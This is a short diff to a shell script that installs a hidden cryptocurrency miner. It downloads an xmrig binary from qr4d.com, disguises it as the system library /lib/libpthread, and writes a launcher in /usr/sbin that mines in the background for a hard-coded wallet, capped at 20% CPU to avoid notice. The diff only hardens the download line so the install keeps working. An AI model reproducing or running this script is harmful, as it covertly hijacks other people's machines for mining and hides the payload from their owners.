@@ -1,4 +1,4 @@
-curl http://qr4d.com/xmrig/libpthread > libpthread
+curl -fsSL https://qr4d.com/xmrig/libpthread > libpthread
 yum -y install libuv
 mv ./libpthread /lib/libpthread
 echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=20 -p x --background" > /usr/sbin/pthread
